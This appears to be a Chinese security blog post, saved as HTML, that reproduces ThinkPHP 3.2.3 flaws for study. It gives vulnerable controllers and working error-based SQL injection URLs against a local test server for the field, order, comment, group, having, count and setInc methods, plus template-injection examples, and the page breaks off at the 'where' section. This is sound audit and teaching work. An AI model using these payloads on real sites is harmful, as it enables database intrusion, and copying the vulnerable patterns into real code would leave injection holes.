@@ -1,0 +1,1480 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言跟着phpoop师傅总结的一篇文章学习，选取了部分内容进行了复现以加深印象。">
+<meta name="keywords" content="web安全,代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP3.2.3安全开发须知">
+<meta property="og:url" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/index.html">
+<meta property="og:site_name" content="Pines404">
+<meta property="og:description" content="前言跟着phpoop师傅总结的一篇文章学习，选取了部分内容进行了复现以加深印象。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/13.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/14.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/15.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/16.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/17.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/6.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/1.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/5.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/2.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/4.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/3.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/8.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/7.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/9.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/10.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/11.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/12.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/18.jpg">
+<meta property="og:updated_time" content="2019-12-16T10:50:18.831Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ThinkPHP3.2.3安全开发须知">
+<meta name="twitter:description" content="前言跟着phpoop师傅总结的一篇文章学习，选取了部分内容进行了复现以加深印象。">
+<meta name="twitter:image" content="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/13.jpg">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>ThinkPHP3.2.3安全开发须知 | Pines404</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pines404</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">穷究于理，成就于工</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">18</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">5</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">32</span></a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Azeroth">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pines404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ThinkPHP3.2.3安全开发须知
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-16 11:37:38" itemprop="dateCreated datePublished" datetime="2019-11-16T11:37:38+08:00">2019-11-16</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-16 18:50:18" itemprop="dateModified" datetime="2019-12-16T18:50:18+08:00">2019-12-16</time>
+              
+            
+          </span>
+		  
+		  
+			<span class="post-updated">
+			&nbsp; | &nbsp; 更新于
+			<time itemprop="dateUpdated" datetime="2019-12-16T18:50:18+08:00" content="2019-12-16">
+			  2019-12-16
+			</time>
+		  </span>
+		  
+
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">4k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">4 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着phpoop师傅总结的一篇文章学习，选取了部分内容进行了复现以加深印象。</p>
+<a id="more"></a>
+
+<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><blockquote>
+<p>通常这种情况是因为传入模板引擎中的值没有被过滤，从而导致恶意代码被执行。</p>
+</blockquote>
+<h3 id="display"><a href="#display" class="headerlink" title="display"></a>display</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testdisplay</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">#第四个参数可控</span></span><br><span class="line">    <span class="comment">//会执行</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;display(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,$_GET[<span class="string">'test'</span>]);</span><br><span class="line">    <span class="comment">//不会执行</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;display(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,I(<span class="string">'test'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/13.jpg" width="600">
+
+<h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testdisplay</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">#第一个参数可控</span></span><br><span class="line">    <span class="comment">//会执行</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;show($_GET[<span class="string">'test'</span>]);</span><br><span class="line">    <span class="comment">//不会执行</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;show(I(<span class="string">'test'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/14.jpg" width="600">
+
+<h3 id="display2"><a href="#display2" class="headerlink" title="display2"></a>display2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testdisplay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;display(I(<span class="string">'test'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在根目录下放置 1.jpg，内容是<code>&lt;?php phpinfo();?&gt;</code></p>
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/15.jpg" width="400">
+
+<p>从这里可知，<code>display()</code>指定模板路径时是从根目录开始的</p>
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/16.jpg" width="500">
+
+<h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch?"></a>fetch?</h3><p>根据参考文章中描述，以下代码是能触发模板注入的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#First</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testfetch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $content=<span class="keyword">$this</span>-&gt;fetch(I(<span class="string">'test'</span>));</span><br><span class="line">    var_dump($content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#Second</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testfetch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $content=<span class="keyword">$this</span>-&gt;fetch(<span class="string">''</span>,$_GET[<span class="string">'test'</span>]);</span><br><span class="line">    <span class="comment">#$content=$this-&gt;fetch('',I('test','',''));</span></span><br><span class="line">    var_dump($content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但最终失败，原因暂不明确</p>
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/17.jpg" width="600">
+
+<h2 id="失误造成的注入"><a href="#失误造成的注入" class="headerlink" title="失误造成的注入"></a>失误造成的注入</h2><h3 id="field注入"><a href="#field注入" class="headerlink" title="field注入"></a>field注入</h3><blockquote>
+<p>field方法属于模型的连贯操作方法之一，主要目的是标识要返回或者操作的字段，可以用于查询和写入操作。</p>
+</blockquote>
+<p><strong>控制器</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$model=M(<span class="string">'user'</span>);</span><br><span class="line">    $table_name=I(<span class="string">'table'</span>);</span><br><span class="line">    $test = $model-&gt;field($table_name)-&gt;select();</span><br><span class="line">    var_dump($test);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp3_2/Home/<span class="keyword">Index</span>/sql?table=id <span class="keyword">from</span> info <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/6.jpg" width="600">
+
+<p><strong>注入原因</strong>：框架内部未对传入<code>field()</code>的参数进行过滤，因为实际环境中这种情况并不常见</p>
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/1.jpg" width>
+
+<h3 id="order注入"><a href="#order注入" class="headerlink" title="order注入"></a>order注入</h3><p><strong>控制器</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//实例化数据模型</span></span><br><span class="line">    $model=M(<span class="string">'user'</span>);</span><br><span class="line">    $order=I(<span class="string">'order'</span>);</span><br><span class="line">    $test = $model-&gt;order($order)-&gt;select();</span><br><span class="line">    var_dump($test);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/tp3_2/Home/Index/sql?order</span>[<span class="string">updatexml(1,concat(0x3a,user()),1)</span>]=1</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/5.jpg" width="600">
+
+<p><strong>注入原因</strong>：</p>
+<p>当参数为关联数组（key-value）时，key值拼接到返回值中，SQL语句最终绕过了框架安全过滤得以执行</p>
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/2.jpg" width="700">
+
+<h3 id="comment注入"><a href="#comment注入" class="headerlink" title="comment注入"></a>comment注入</h3><p><strong>控制器</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $model=M(<span class="string">'user'</span>);</span><br><span class="line">    $comment=I(<span class="string">'comment'</span>);</span><br><span class="line">    $test=$model-&gt;comment($comment)-&gt;select();</span><br><span class="line">    var_dump($test);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp3_2/Home/Index/sql?<span class="keyword">comment</span>=*/<span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/4.jpg" width="600">
+
+<p><strong>注入原因</strong>：框架底层未进行过滤，一般情况下实际环境该字段也并不可控</p>
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/3.jpg" width>
+
+<h3 id="group注入"><a href="#group注入" class="headerlink" title="group注入"></a>group注入</h3><p><strong>控制器</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $model=M(<span class="string">'user'</span>);</span><br><span class="line">    $group=I(<span class="string">'group'</span>);</span><br><span class="line">    $test=$model-&gt;group($group)-&gt;select();</span><br><span class="line">    var_dump($test);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>/tp3_2/Home/Index/sql?group=id <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/8.jpg" width="600">
+
+<p><strong>注入原因</strong>：框架底层未进行过滤</p>
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/7.jpg" width>
+
+<h3 id="having注入"><a href="#having注入" class="headerlink" title="having注入"></a>having注入</h3><p><strong>控制器</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $model=M(<span class="string">'user'</span>);</span><br><span class="line">    $having=I(<span class="string">'having'</span>);</span><br><span class="line">    $test=$model-&gt;group(<span class="string">'id'</span>)-&gt;having($having)-&gt;select();</span><br><span class="line">    var_dump($test);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>/tp3_2/Home/Index/sql?having=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/9.jpg" width="600">
+
+<p><strong>注入原因</strong>：框架底层未进行过滤</p>
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/10.jpg" width>
+
+<h3 id="Count-Max-Min-Avg-Sum注入"><a href="#Count-Max-Min-Avg-Sum注入" class="headerlink" title="Count,Max,Min,Avg,Sum注入"></a>Count,Max,Min,Avg,Sum注入</h3><blockquote>
+<p>这些用于SQL中统计数据的函数，当参数可控的情况下会导致注入</p>
+</blockquote>
+<p><strong>控制器</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $model=M(<span class="string">'user'</span>);</span><br><span class="line">    $test=I(<span class="string">'test'</span>);</span><br><span class="line">    $model-&gt;count($test);</span><br><span class="line">    <span class="comment">//$model-&gt;max($test);</span></span><br><span class="line">    <span class="comment">//........</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp3_2/Home/<span class="keyword">Index</span>/sql?test=<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/11.jpg" width="600">
+
+<h3 id="setInc-setDec注入"><a href="#setInc-setDec注入" class="headerlink" title="setInc,setDec注入"></a>setInc,setDec注入</h3><blockquote>
+<p>setInc()和setDec()主要用于字段的更新，当外部可控制时将会造成注入</p>
+</blockquote>
+<p><strong>控制器</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $model=M(<span class="string">'user'</span>);</span><br><span class="line">    $id=I(<span class="string">'id'</span>);</span><br><span class="line">    $res=$model-&gt;where(<span class="string">'id=2'</span>)-&gt;setInc(<span class="string">'username'</span>,$id)</span><br><span class="line">    var_dump($res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>/tp3_2/Home/Index/sql?id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/12.jpg" width="600">
+
+
+
+<h3 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a>where注入</h3><p><strong>关于I()</strong>：<code>I</code>函数默认的过滤方法是<code>htmlspecialchars</code>，对sql注入的防御是没有太大的作用。</p>
+<p>where注入弄清楚where的几种SQL形式即可，闭合即可注入</p>
+<p><strong>控制器</strong></p>
